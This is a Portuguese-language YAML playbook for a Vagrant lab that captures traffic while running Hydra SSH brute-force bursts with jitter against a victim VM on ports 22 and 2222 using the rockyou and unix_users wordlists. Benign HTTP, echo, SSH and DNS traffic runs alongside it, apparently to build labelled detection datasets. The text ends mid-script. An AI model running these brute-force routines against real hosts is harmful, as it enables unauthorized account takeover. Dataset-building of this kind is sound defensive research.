version: 1
name: hydra_attack_capture
description: Inicia captura no sensor (iface correta), executa Hydra do atacante contra a vítima, encerra e valida o PCAP.
vars:
  out_dir: /vagrant/data
  cap_dir: /vagrant/data/captures
  log_dir: /vagrant/data/logs
  hydra_dir: /home/vagrant/data/hydra
  user_list: /usr/share/wordlists/metasploit/unix_users.txt
  pass_list: /usr/share/wordlists/rockyou.txt
  hydra_service: ssh
  hydra_threads: 8                 # ↓ reduz volume de ataque
  pcap_bpf: (host {victim_ip} or host {attacker_ip})
  hydra_users_max: 50               # novo: limita usuários usados no brute
  hydra_pwds_max: 50               # novo: limita senhas usadas no brute
  dns_names: "example.org httpbin.org cloudflare.com"
  https_urls: "https://example.org https://httpbin.org/get https://www.cloudflare.com"
  ssh_user: "vagrant"
  ssh_key_path: "/home/vagrant/.ssh/id_rsa"
  scp_src_file: "/tmp/readme_small.txt"
  scp_dst_dir: "/home/vagrant/"
  repeats_small: 3
  repeats_medium: 2
  think_min_ms: 300
  think_max_ms: 1200
  hydra_bursts: 18                         # 0 => usa 1 ciclo completo; >0 => número total de rajadas
  hydra_burst_ports_cycle: "22,2222"       # ciclo de portas a repetir por rajada
  hydra_burst_sleep_min_s: 8               # sleep mínimo antes de cada rajada (seg)
  hydra_burst_sleep_max_s: 8               # sleep máximo antes de cada rajada (seg)
  hydra_burst_timeout_s: 300
  hydra_burst_users_per: 200
  hydra_burst_pwds_per: 200
  hydra_burst_jitter_min_ms: 200
  hydra_burst_jitter_max_ms: 900
  benign1_scale: 8                # fator multiplicador global
  benign1_parallel: 8
  benign1_reqs_http: 40
  benign1_reqs_echo: 40
  benign1_ping_count: 30
  benign1_ssh_conn: 30
  benign1_iperf_sess: 8
  benign1_splay_max_ms: 80
  benign1_http_timeout_s: 3
  benign1_echo_timeout_s: 3
  benign1_ssh_timeout_s: 3
  benign1_iperf_timeout_s: 2
  benign2_scale: 10
  benign2_parallel: 6
  benign2_dns_repeats: 10
  benign2_https_repeats: 8
  benign2_dns_timeout_s: 3
  benign2_https_timeout_s: 6
  benign2_jitter_min_ms: 250
  benign2_jitter_max_ms: 1200
  benign3_scale: 9
  benign3_parallel: 5
  benign3_ssh_repeats: 6
  benign3_scp_repeats: 4
  benign3_ssh_timeout_s: 8
  benign3_scp_timeout_s: 10
  benign3_jitter_min_ms: 300
  benign3_jitter_max_ms: 1500


# Usado pelo parser para rotação caso você acione o step interno de captura avançada
capture:
  rotate_seconds: 300
  rotate_size_mb: 100

steps:
  - id: sensor_cleanup
    title: "Sensor | Limpar sessões antigas de captura"
    description: "Encerra tmux/tcpdump residuais e prepara diretórios."
    host: sensor
    tags: ["sensor","prep"]
    eta: "<3s"
    timeout: 30
    artifacts: []
    script: |
      set -Eeuo pipefail
      mkdir -p "{cap_dir}" "{log_dir}"
      # encerra sessões tmux de captura (prefixo cap_)
      if tmux ls 2>/dev/null | grep -q '^cap_'; then
        for s in $(tmux ls | awk -F: '/^cap_/ {print $1}'); do tmux kill-session -t "$s" || true; done
      fi
      pkill -f "tcpdump -i" || true

      rm -f "{cap_dir}"/*.pcap "{cap_dir}"/*.pcap.sha256 2>/dev/null || true
      rm -f "{cap_dir}/.last_ts" 2>/dev/null || true
      rm -f "{cap_dir}/conn.log" 2>/dev/null || true
      rm -f "{cap_dir}/packet_filter.log" 2>/dev/null || true
      rm -f "{cap_dir}/ssh.log" 2>/dev/null || true
      rm -rf "{cap_dir}/zeek_out_"* 2>/dev/null || true
      rm -f "{cap_dir}/timeline" 2>/dev/null || true
      rm -f "{log_dir}/capture_"*.log 2>/dev/null || true
      rm -f "{log_dir}/cleanup_"*.log 2>/dev/null || true

      sleep 1
      date +"%F %T" | tee -a "{log_dir}/cleanup_$(date +%Y%m%d_%H%M%S).log"

  - id: attacker_cleanup
    title: "Atacante | Limpar Hydra antigo"
    description: "Prepara diretório do Hydra."
    host: attacker
    tags: ["attacker","prep"]
    eta: "<3s"
    timeout: 30
    artifacts: []
    script: |
      set -Eeuo pipefail
      mkdir -p "{hydra_dir}" "{cap_dir}"
      chown -R vagrant:vagrant "{hydra_dir}" || true
      rm -f "{hydra_dir}"/*.log 2>/dev/null || true
      rm -f "{hydra_dir}/.last_ts" 2>/dev/null || true
      rm -f "{hydra_dir}/*.restore" 2>/dev/null || true
      rm -f "{cap_dir}/timeline" 2>/dev/null || true
      rm -f "{cap_dir}/manifest"* 2>/dev/null || true

  - id: sensor_capture_start
    title: "Sensor | Iniciar captura (iface correta)"
    description: "Descobre iface via rota para vítima/atacante e inicia tcpdump em tmux."
    host: sensor
    tags: ["sensor","capture"]
    eta: "<3s"
    timeout: 30
    artifacts:
      - "{cap_dir}/cap_${TS}.pcap"
      - "{log_dir}/capture_${TS}.log"
    script: |
      set -Eeuo pipefail
      TS=$(date +%Y%m%d_%H%M%S)
      mkdir -p "{cap_dir}" "{log_dir}"
      sess="cap_${TS}"
      victim="{victim_ip}"
      attacker="{attacker_ip}"
      IFACE=$(ip route get "$victim" 2>/dev/null | awk '/dev/ {for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
      [ -z "${IFACE:-}" ] && IFACE=$(ip route get "$attacker" 2>/dev/null | awk '/dev/ {for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
      [ -z "${IFACE:-}" ] && IFACE=$(ip -br link | awk '/UP/ && !/LOOPBACK/ {print $1; exit}')
      echo "[capture] iface=$IFACE" | tee -a "{log_dir}/capture_${TS}.log"
      tmux new-session -d -s "$sess" "bash -lc 'exec tcpdump -i $IFACE -U -nn -s 0 -w {cap_dir}/cap_${TS}.pcap '\''{pcap_bpf}'\'' 2>>{log_dir}/capture_${TS}.log'"
      echo "$TS" > {cap_dir}/.last_ts

  - id: victim_start_benign_services
    title: "Victim - Iniciar serviços benignos (HTTP/Echo/iperf3)"
    description: "Sobe serviços leves no victim para gerar tráfego benigno variado (HTTP em 8080, Echo TCP em 9090 e opcional iperf3 -s)."
    host: victim
    tags: [ "benign", "victim", "http", "echo", "iperf3", "setup" ]
    eta: "30s"
    timeout: 180
    artifacts:
      - "/tmp/http_8080.log"
      - "/tmp/echo_9090.log"
      - "/tmp/iperf3_server.log"
      - "/tmp/http_8080.pid"
      - "/tmp/echo_9090.pid"
      - "/tmp/iperf3_server.pid"
      - "{cap_dir}/timeline"
    script: |
      set -euo pipefail
      set -x

      log()  { echo "[victim_start_benign_services] $*"; logger -t victim_start_benign_services "$*"; }
      
      log "Verificando socat…"
      if ! command -v socat >/dev/null 2>&1; then
        log "socat não encontrado. Instalando…"
        sudo apt-get update -y
        sudo DEBIAN_FRONTEND=noninteractive apt-get install -y socat
        log "socat instalado."
      else
        log "socat já instalado."
      fi
      
      log "Abrindo porta 9090 no firewall (se aplicável)…"
      # UFW (se ativo)
      if command -v ufw >/dev/null 2>&1; then
        if sudo ufw status | grep -qi "Status: active"; then
          if ! sudo ufw status | grep -qE '9090/tcp.*ALLOW'; then
            sudo ufw allow 9090/tcp || true
            log "Regra UFW aplicada para 9090/tcp."
          else
            log "Regra UFW para 9090/tcp já existente."
          fi
        else
          log "UFW inativo — pulando."
        fi
      fi
      
      # iptables (adiciona regra INPUT se não existir)
      if command -v iptables >/dev/null 2>&1; then
        if ! sudo iptables -C INPUT -p tcp --dport 9090 -j ACCEPT 2>/dev/null; then
          sudo iptables -I INPUT -p tcp --dport 9090 -j ACCEPT || true
          log "Regra iptables aplicada para 9090/tcp."
        else
          log "Regra iptables para 9090/tcp já existente."
        fi
      fi
      
      log "Verificando listener atual na porta 9090…"
      if sudo ss -ltnp | grep -qE 'LISTEN +\S+ +\S+ +0\.0\.0\.0:9090'; then
        log "Listener já ativo em 0.0.0.0:9090 — nada a fazer."
      else
        log "Iniciando listener socat em 0.0.0.0:9090…"
        # usar shell root para que o redirecionamento do log funcione
        sudo bash -c "nohup socat -v TCP-LISTEN:9090,reuseaddr,fork EXEC:'/bin/cat' > /var/log/socat_9090.log 2>&1 &"
      
        # validação (aguarda até 10s)
        for i in $(seq 1 10); do
          if sudo ss -ltnp | grep -qE 'LISTEN +\S+ +\S+ +0\.0\.0\.0:9090'; then
            log "Listener confirmado em 0.0.0.0:9090 (tentativa ${i})."
            break
          fi
          sleep 1
        done
      
        if ! sudo ss -ltnp | grep -qE 'LISTEN +\S+ +\S+ +0\.0\.0\.0:9090'; then
          log "ERRO: não foi possível iniciar o listener em 9090. Consulte /var/log/socat_9090.log."
          exit 1
        fi
      fi
      
      log "Estado final do listener:"
      sudo ss -ltnp | awk 'NR==1 || /9090/ {print}'
      
      log "Benign service 9090 pronto."

  - id: victim_enable_sshd_2222
    title: "Victim - Habilitar SSH também na porta 2222"
    description: "Configura sshd para escutar em 2222 e abre firewall."
    host: victim
    tags: [ "victim", "ssh", "setup" ]
    eta: "<10s"
    timeout: 120
    artifacts: [ ]
    script: |
      set -Eeuo pipefail
      echo "[victim] Habilitando sshd em 2222…"
      if ! command -v sshd >/dev/null 2>&1; then
        sudo apt-get update -y
        sudo DEBIAN_FRONTEND=noninteractive apt-get install -y openssh-server
      fi

      # Adiciona porta 2222 em um fragmento seguro de config
      sudo mkdir -p /etc/ssh/sshd_config.d
      if ! grep -qE '^[[:space:]]*Port[[:space:]]+2222\b' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/* 2>/dev/null; then
        echo "Port 2222" | sudo tee /etc/ssh/sshd_config.d/2222.conf >/dev/null
      fi

      # Libera no firewall, se aplicável
      if command -v ufw >/dev/null 2>&1; then
        if sudo ufw status | grep -qi "Status: active"; then
          sudo ufw allow 2222/tcp || true
        fi
      fi
      if command -v iptables >/dev/null 2>&1; then
        sudo iptables -C INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null || sudo iptables -I INPUT -p tcp --dport 2222 -j ACCEPT || true
      fi

      sudo systemctl restart ssh || sudo service ssh restart || true
      sleep 1
      if sudo ss -ltnp | grep -qE 'LISTEN +\S+ +\S+ +0\.0\.0\.0:2222'; then
        echo "[victim] sshd ouvindo em 2222."
      else
        echo "[victim] aviso: não foi possível confirmar sshd em 2222."
      fi

  - id: "attacker_benign_traffic_phase1"
    title: "Attacker - Gerar tráfego benigno (fase 1 - pré-ataque)"
    description: "Gera muitas conexões curtas (HTTP sem keep-alive, Echo TCP, ICMP, SSH curtos, iperf3) e grava marcadores benign1_* no timeline."
    host: attacker
    tags: [ "benign", "http", "echo", "icmp", "ssh", "iperf3", "pre-attack" ]
    eta: "dinâmico"
    timeout: 1000
    artifacts:
      - "{cap_dir}/timeline"
    script: |
      set -Eeuo pipefail
      set -x

      echo "[attacker] Fase BENIGNA 1 (pré-ataque)"
      VICTIM_HOST="${VICTIM_HOST:-victim}"
      VICTIM_IP="$(getent hosts "${VICTIM_HOST}" | awk '{print $1}' || true)"
      VICTIM_IP="${VICTIM_IP:-192.168.56.12}"

      CAP_DIR="/vagrant/data/captures"
      mkdir -p "${CAP_DIR}" || true

      # timeline: marca início uma vez
      printf 'benign1_start=%s\n' "$(date +%s)" | tee -a "${CAP_DIR}/timeline" >/dev/null || true
      trap 'printf "benign1_end=%s\n" "$(date +%s)" | tee -a "${CAP_DIR}/timeline" >/dev/null || true' EXIT

      # ---------- CONFIG parametrizada via vars ----------
      HTTP_PORT=8080
      ECHO_PORT=9090
      PARALLEL="{benign1_parallel}"

      SCALE="{benign1_scale}"
      REQS_HTTP=$(( {benign1_reqs_http} * SCALE ))
      REQS_ECHO=$(( {benign1_reqs_echo} * SCALE ))
      PING_COUNT=$(( {benign1_ping_count} * SCALE ))
      SSH_CONN=$(( {benign1_ssh_conn} * SCALE ))
      IPERF_SESS=$(( {benign1_iperf_sess} * SCALE ))

      SPLAY_MAX="{benign1_splay_max_ms}"

      HTTP_TIMEOUT="{benign1_http_timeout_s}"
      ECHO_TIMEOUT="{benign1_echo_timeout_s}"
      SSH_TIMEOUT="{benign1_ssh_timeout_s}"
      IPERF_TIMEOUT="{benign1_iperf_timeout_s}"

      # ---------- utilidades seguras ----------
      msleep() {
        local ms="${1:-0}"
        if command -v python3 >/dev/null 2>&1; then
          python3 -c 'import sys,time; time.sleep(float(sys.argv[1])/1000.0)' "${ms}" >/dev/null 2>&1 && return 0
        fi
        if command -v perl >/dev/null 2>&1; then
          perl -e 'select undef,undef,undef, $ARGV[0]/1000' "${ms}" >/dev/null 2>&1 && return 0
        fi
        sleep "0.$(printf '%03d' "${ms}")" >/dev/null 2>&1 || true
        return 0
      }

      unset -f rand_path 2>/dev/null || true
      rand_path() {
        local len=$((8 + RANDOM % 8))
        local out="" chars=abcdefghijklmnopqrstuvwxyz0123456789
        local i
        for ((i=0; i<len; i++)); do
          out+="${chars:RANDOM%${#chars}:1}"
        done
        printf '%s' "$out"
      }

      log(){ echo "[attacker.benign1] $*"; }

      wait_port() {
        local host="$1" port="$2" tries="${3:-12}" delay="${4:-0.5}" to="${5:-2}"
        for i in $(seq 1 "$tries"); do
          if command -v nc >/dev/null 2>&1; then
            if nc -z -w "$to" "$host" "$port" >/dev/null 2>&1; then
              return 0
            fi
          fi
          if timeout "$to" bash -c "exec 3<>/dev/tcp/${host}/${port}" 2>/dev/null; then
            exec 3>&- 3<&-
            return 0
          fi
          sleep "$delay"
        done
        return 1
      }

      do_http(){
        curl -fsS --max-time "${HTTP_TIMEOUT}" --http1.1 --no-keepalive \
          "http://${VICTIM_IP}:${HTTP_PORT}/$(rand_path)" >/dev/null 2>&1 || :
        msleep "$((RANDOM % SPLAY_MAX))" || :
      }

      do_echo(){
        { echo "hello $(rand_path)"; echo "t $(date +%s)"; } \
          | timeout "${ECHO_TIMEOUT}" nc "${VICTIM_IP}" "${ECHO_PORT}" >/dev/null 2>&1 || :
        msleep "$((RANDOM % SPLAY_MAX))" || :
      }

      do_ping(){
        ping -c1 -W1 "${VICTIM_IP}" >/dev/null 2>&1 || :
        msleep "$((RANDOM % SPLAY_MAX))" || :
      }

      do_ssh(){
        if command -v sshpass >/dev/null 2>&1; then
          timeout "${SSH_TIMEOUT}" sshpass -p "${SSH_PASS:-vagrant}" ssh \
            -o StrictHostKeyChecking=no -o ConnectTimeout=1 \
            "${SSH_USER:-vagrant}@${VICTIM_IP}" "true" >/dev/null 2>&1 || :
        else
          timeout "${SSH_TIMEOUT}" ssh -o StrictHostKeyChecking=no -o BatchMode=no -o ConnectTimeout=1 \
            "${SSH_USER:-vagrant}@${VICTIM_IP}" "true" >/dev/null 2>&1 || :
        fi
        msleep "$((RANDOM % SPLAY_MAX))" || :
      }

      do_iperf(){
        if command -v iperf3 >/dev/null 2>&1; then
          timeout "${IPERF_TIMEOUT}" iperf3 -c "${VICTIM_IP}" -t 1 >/dev/null 2>&1 || :
        fi
        msleep "$((RANDOM % SPLAY_MAX))" || :
      }

      run_many(){
        local count="$1" func="$2"
        local running=0 i
        for ((i=1; i<=count; i++)); do
          "$func" &
          ((running++))
          if (( running >= PARALLEL )); then
            if ! wait -n 2>/dev/null; then
              for p in $(jobs -p); do wait "$p" && break || true; done
            fi
            ((running--))
          fi
        done
        wait || true
      }

      # Health-checks
      if curl -s -o /dev/null -I --max-time 2 "http://${VICTIM_IP}:${HTTP_PORT}/"; then
        log "HTTP ${VICTIM_IP}:${HTTP_PORT} OK (HEAD)."
      else
        log "aviso: HTTP possivelmente indisponível em ${VICTIM_IP}:${HTTP_PORT} (HEAD falhou)."
      fi

      if timeout 2 bash -c "echo -n X > /dev/tcp/${VICTIM_IP}/${ECHO_PORT}" 2>/dev/null; then
        log "ECHO ${VICTIM_IP}:${ECHO_PORT} OK (warm-up)."
      else
        log "ECHO warm-up falhou, aguardando porta abrir…"
      fi

      if wait_port "${VICTIM_IP}" "${ECHO_PORT}" 12 0.5 2; then
        log "ECHO ${VICTIM_IP}:${ECHO_PORT} pronto."
      else
        log "aviso: ECHO TCP possivelmente fechado em ${VICTIM_IP}:${ECHO_PORT} após tentativas."
      fi

      set +e
      set +o pipefail

      run_many "${REQS_HTTP}"  do_http
      run_many "${REQS_ECHO}"  do_echo
      run_many "${PING_COUNT}" do_ping
      run_many "${SSH_CONN}"   do_ssh
      run_many "${IPERF_SESS}" do_iperf

      set -e
      set -o pipefail

      echo "[attacker] Benign 1 concluído."

  - id: attacker_hydra_run_bursts_22_2222
    title: "Atacante | Executar Hydra em rajadas temporais (22 e 2222)"
    description: "Rajadas cronometradas com jitter e ciclo de portas configurável."
    host: attacker
    tags: [ "attacker","credential_access","MITRE:T1110","attack","hydra" ]
    timeout: 12000
    eta: "dinâmico"
    artifacts:
      - "{hydra_dir}/hydra_${TS}.log"
      - "{cap_dir}/timeline"
    script: |
      set -Eeuo pipefail
      CAP_DIR="{cap_dir}"
      HYD_DIR="{hydra_dir}"
      mkdir -p "$CAP_DIR" "$HYD_DIR"

      USERS_N="{hydra_burst_users_per}"
      PWDS_N="{hydra_burst_pwds_per}"
      TMO="{hydra_burst_timeout_s}"

      jitter_ms() {
        local min="{hydra_burst_jitter_min_ms}" max="{hydra_burst_jitter_max_ms}" r span ms s rem
        if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
        span=$((max-min+1)); ms=$(( (r % span) + min ))
        s=$(( ms / 1000 )); rem=$(( ms % 1000 ))
        sleep "${s}.$(printf '%03d' "$rem")"
      }

      sleep_between() {
        local min="{hydra_burst_sleep_min_s}" max="{hydra_burst_sleep_max_s}"
        if [ -z "$min" ] || [ -z "$max" ]; then return 0; fi
        if [ "$min" -eq "$max" ] 2>/dev/null; then
          sleep "$min"
        else
          local r span val
          if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
          span=$((max-min+1)); val=$(( (r % span) + min ))
          sleep "$val"
        fi
      }

      make_subset() {
        local src="$1" n="$2" dst="$3"
        if command -v shuf >/dev/null 2>&1; then shuf -n "$n" "$src" > "$dst"; else head -n "$n" "$src" > "$dst"; fi
      }

      run_burst() {
        local idx="$1" port="$2" timeout_s="$3"
        local ts_now name ufile pfile logf
        ts_now="$(date +%s)"
        name="hydra_burst${idx}_p${port}"
        ufile="${HYD_DIR}/users.b${idx}.txt"
        pfile="${HYD_DIR}/pwds.b${idx}.txt"
        logf="${HYD_DIR}/hydra_$(date +%Y%m%d_%H%M%S)_b${idx}_p${port}.log"

        make_subset "{hydra_dir}/users.slice.txt"  "$USERS_N" "$ufile"
        make_subset "{hydra_dir}/rockyou.slice.txt" "$PWDS_N"  "$pfile"

        printf '%s_start=%s\n' "$name" "$ts_now" | tee -a "$CAP_DIR/timeline" >/dev/null || true

        if [ "$port" = "22" ]; then
          timeout "$timeout_s" hydra -I -V -t {hydra_threads} -L "$ufile" -P "$pfile" -o "$logf" {victim_ip} {hydra_service} || true
        else
          timeout "$timeout_s" hydra -I -V -t {hydra_threads} -s "$port" -L "$ufile" -P "$pfile" -o "$logf" {victim_ip} {hydra_service} || true
        fi

        printf '%s_end=%s\n' "$name" "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true
      }

      IFS=',' read -r -a CYCLE <<< "{hydra_burst_ports_cycle}"
      cycle_n=${#CYCLE[@]}
      if (( cycle_n == 0 )); then echo "[hydra] Ciclo de portas vazio."; exit 0; fi

      n_cfg="{hydra_bursts}"
      if [[ -z "$n_cfg" || "$n_cfg" = "0" ]]; then N="$cycle_n"; else N="$n_cfg"; fi

      echo "[hydra] Iniciando $N rajada(s) com ciclo de portas: {hydra_burst_ports_cycle}"
      printf 'hydra_multi_start=%s\n' "$(date +%s)" >> "$CAP_DIR/timeline" || true

      for ((i=0;i<N;i++)); do
        sleep_between; jitter_ms
        port="${CYCLE[$(( i % cycle_n ))]}"
        echo "[hydra] Rajada $((i+1))/$N na porta $port…"
        run_burst "$((i+1))" "$port" "$TMO"
        jitter_ms
      done

      printf 'hydra_multi_end=%s\n' "$(date +%s)" >> "$CAP_DIR/timeline" || true
      echo "[hydra] Rajadas concluídas."
  - id: victim_disable_sshd_2222
    title: "Victim - Garantir porta 2222 fechada (sem serviço)"
    description: "Remove config de sshd em 2222, fecha firewall e reinicia o serviço."
    host: victim
    tags: [ "victim", "ssh", "hardening" ]
    eta: "<10s"
    timeout: 120
    artifacts: [ ]
    script: |
      set -Eeuo pipefail
      echo "[victim] Desabilitando sshd em 2222…"
      sudo rm -f /etc/ssh/sshd_config.d/2222.conf || true
      if command -v ufw >/dev/null 2>&1; then
        if sudo ufw status | grep -qi "Status: active"; then
          sudo ufw deny 2222/tcp || true
          sudo ufw delete allow 2222/tcp 2>/dev/null || true
        fi
      fi
      if command -v iptables >/dev/null 2>&1; then
        sudo iptables -D INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null || true
        sudo iptables -I INPUT -p tcp --dport 2222 -j REJECT 2>/dev/null || true
      fi
      sudo systemctl restart ssh || sudo service ssh restart || true
      sleep 1
      if sudo ss -ltnp | grep -qE 'LISTEN +\S+ +\S+ +0\.0\.0\.0:2222'; then
        echo "[victim] aviso: ainda há listener em 2222 (verificar config)."
      else
        echo "[victim] 2222 fechada (sem serviço)."
      fi

  - id: attacker_hydra_run_bursts
    title: "Atacante | Hydra em rajadas temporais (configuráveis)"
    description: "Rajadas com jitter; ciclo de portas e intervalo de sleep por variáveis."
    host: attacker
    tags: [ "attacker","credential_access","MITRE:T1110","attack","hydra" ]
    timeout: 12000
    eta: "dinâmico"
    artifacts:
      - "{hydra_dir}/hydra_${TS}.log"
      - "{cap_dir}/timeline"
    script: |
      set -Eeuo pipefail
      CAP_DIR="{cap_dir}"
      HYD_DIR="{hydra_dir}"
      mkdir -p "$CAP_DIR" "$HYD_DIR"

      USERS_N="{hydra_burst_users_per}"
      PWDS_N="{hydra_burst_pwds_per}"
      TMO="{hydra_burst_timeout_s}"

      jitter_ms() {
        local min="{hydra_burst_jitter_min_ms}" max="{hydra_burst_jitter_max_ms}" r span ms s rem
        if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
        span=$((max-min+1)); ms=$(( (r % span) + min ))
        s=$(( ms / 1000 )); rem=$(( ms % 1000 ))
        sleep "${s}.$(printf '%03d' "$rem")"
      }

      sleep_between() {
        local min="{hydra_burst_sleep_min_s}" max="{hydra_burst_sleep_max_s}"
        if [ -z "$min" ] || [ -z "$max" ]; then return 0; fi
        if [ "$min" -eq "$max" ] 2>/dev/null; then
          sleep "$min"
        else
          local r span val
          if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
          span=$((max-min+1)); val=$(( (r % span) + min ))
          sleep "$val"
        fi
      }

      make_subset() {
        local src="$1" n="$2" dst="$3"
        if command -v shuf >/dev/null 2>&1; then shuf -n "$n" "$src" > "$dst"; else head -n "$n" "$src" > "$dst"; fi
      }

      run_burst() {
        local idx="$1" port="$2" timeout_s="$3"
        local ts_now name ufile pfile logf
        ts_now="$(date +%s)"
        name="hydra_burst${idx}_p${port}"
        ufile="${HYD_DIR}/users.b${idx}.txt"
        pfile="${HYD_DIR}/pwds.b${idx}.txt"
        logf="${HYD_DIR}/hydra_$(date +%Y%m%d_%H%M%S)_b${idx}_p${port}.log"

        make_subset "{hydra_dir}/users.slice.txt"  "$USERS_N" "$ufile"
        make_subset "{hydra_dir}/rockyou.slice.txt" "$PWDS_N"  "$pfile"

        printf '%s_start=%s\n' "$name" "$ts_now" | tee -a "$CAP_DIR/timeline" >/dev/null || true

        if [ "$port" = "22" ]; then
          timeout "$timeout_s" hydra -I -V -t {hydra_threads} -L "$ufile" -P "$pfile" -o "$logf" {victim_ip} {hydra_service} || true
        else
          timeout "$timeout_s" hydra -I -V -t {hydra_threads} -s "$port" -L "$ufile" -P "$pfile" -o "$logf" {victim_ip} {hydra_service} || true
        fi

        printf '%s_end=%s\n' "$name" "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true
      }

      IFS=',' read -r -a CYCLE <<< "{hydra_burst_ports_cycle}"
      cycle_n=${#CYCLE[@]}
      if (( cycle_n == 0 )); then echo "[hydra] Ciclo de portas vazio."; exit 0; fi

      n_cfg="{hydra_bursts}"
      if [[ -z "$n_cfg" || "$n_cfg" = "0" ]]; then N="$cycle_n"; else N="$n_cfg"; fi

      echo "[hydra] Iniciando $N rajada(s) com ciclo de portas: {hydra_burst_ports_cycle}"
      printf 'hydra_multi_start=%s\n' "$(date +%s)" >> "$CAP_DIR/timeline" || true

      for ((i=0;i<N;i++)); do
        sleep_between; jitter_ms
        port="${CYCLE[$(( i % cycle_n ))]}"
        echo "[hydra] Rajada $((i+1))/$N na porta $port…"
        run_burst "$((i+1))" "$port" "$TMO"
        jitter_ms
      done

      printf 'hydra_multi_end=%s\n' "$(date +%s)" >> "$CAP_DIR/timeline" || true
      echo "[hydra] Concluído."

  - id: attacker_benign_dns_https
    title: "Attacker - DNS básico e navegação HTTPS curta"
    description: "Resolve A de domínios e faz GET HTTPS curtos, com jitter e marcação no timeline."
    host: attacker
    tags: [ "attacker","benign","dns","https","pre-attack" ]
    eta: "dinâmico"
    timeout: 7200
    artifacts:
      - "{cap_dir}/timeline"
    script: |
      set -Eeuo pipefail
      CAP_DIR="{cap_dir}"
      mkdir -p "$CAP_DIR" || true
      printf 'dnshttps_start=%s\n' "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true
      trap 'printf "dnshttps_end=%s\n" "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true' EXIT

      # ---------- CONFIG parametrizada via vars ----------
      PARALLEL="{benign2_parallel}"
      SCALE="{benign2_scale}"
      DNS_N=$(( {benign2_dns_repeats}   * SCALE ))
      HTTPS_N=$(( {benign2_https_repeats} * SCALE ))
      DNS_TMO="{benign2_dns_timeout_s}"
      HTTPS_TMO="{benign2_https_timeout_s}"

      # listas vindas de vars
      read -r -a DNS_ARR <<< "{dns_names}"
      read -r -a URL_ARR <<< "{https_urls}"

      jitter_ms() {
        local min="{benign2_jitter_min_ms}" max="{benign2_jitter_max_ms}" r span ms s rem
        if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
        span=$((max-min+1)); ms=$(( (r % span) + min ))
        s=$(( ms / 1000 )); rem=$(( ms % 1000 ))
        sleep "${s}.$(printf '%03d' "$rem")"
      }

      run_many(){
        local count="$1" func="$2"
        local running=0 i
        for ((i=1; i<=count; i++)); do
          "$func" &
          ((running++))
          if (( running >= PARALLEL )); then
            if ! wait -n 2>/dev/null; then
              for p in $(jobs -p); do wait "$p" && break || true; done
            fi
            ((running--))
          fi
        done
        wait || true
      }

      do_dns(){
        if ((${#DNS_ARR[@]}==0)); then return 0; fi
        local idx=$(( RANDOM % ${#DNS_ARR[@]} ))
        local name="${DNS_ARR[$idx]}"
        # tenta dig; fallback para getent
        timeout "$DNS_TMO" dig +retry=1 +time="$DNS_TMO" "$name" A >/dev/null 2>&1 \
          || timeout "$DNS_TMO" getent hosts "$name" >/dev/null 2>&1 || true
        jitter_ms
      }

      do_https(){
        if ((${#URL_ARR[@]}==0)); then return 0; fi
        local idx=$(( RANDOM % ${#URL_ARR[@]} ))
        local url="${URL_ARR[$idx]}"
        curl -m "$HTTPS_TMO" -sSL "$url" >/dev/null 2>&1 || true
        jitter_ms
      }

      # Execução em paralelo conforme parâmetros
      run_many "$DNS_N"   do_dns
      run_many "$HTTPS_N" do_https

  - id: attacker_benign_ssh_scp
    title: "Attacker - SSH legítimo + SCP pequeno"
    description: "Executa logins SSH reais com chave e transfere arquivo pequeno via SCP (benigno), parametrizados via vars e com paralelismo."
    host: attacker
    tags: [ "attacker","benign","ssh","scp","post-attack" ]
    eta: "dinâmico"
    timeout: 7200
    artifacts:
      - "{cap_dir}/timeline"
      - "{scp_src_file}"
    script: |
      set -Eeuo pipefail

      VICTIM_HOST="${VICTIM_HOST:-victim}"
      VICTIM_IP="$(getent hosts "${VICTIM_HOST}" | awk '{print $1}' || true)"
      VICTIM_IP="${VICTIM_IP:-{victim_ip}}"

      CAP_DIR="{cap_dir}"
      mkdir -p "$CAP_DIR" || true
      printf 'sshscp_start=%s\n' "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true
      trap 'printf "sshscp_end=%s\n" "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true' EXIT

      # ---------- CONFIG via vars ----------
      PARALLEL="{benign3_parallel}"
      SCALE="{benign3_scale}"

      SSH_N=$(( {benign3_ssh_repeats} * SCALE ))
      SCP_N=$(( {benign3_scp_repeats} * SCALE ))

      SSH_TMO="{benign3_ssh_timeout_s}"
      SCP_TMO="{benign3_scp_timeout_s}"

      jitter_ms() {
        local min="{benign3_jitter_min_ms}" max="{benign3_jitter_max_ms}" r span ms s rem
        if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
        span=$((max-min+1)); ms=$(( (r % span) + min ))
        s=$(( ms / 1000 )); rem=$(( ms % 1000 ))
        sleep "${s}.$(printf '%03d' "$rem")"
      }

      run_many(){
        local count="$1" func="$2"
        local running=0 i
        for ((i=1; i<=count; i++)); do
          "$func" &
          ((running++))
          if (( running >= PARALLEL )); then
            if ! wait -n 2>/dev/null; then
              for p in $(jobs -p); do wait "$p" && break || true; done
            fi
            ((running--))
          fi
        done
        wait || true
      }

      do_ssh(){
        timeout "$SSH_TMO" ssh -i "{ssh_key_path}" \
          -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
          "{ssh_user}@${VICTIM_IP}" 'true' >/dev/null 2>&1 || true
        jitter_ms
      }

      do_scp(){
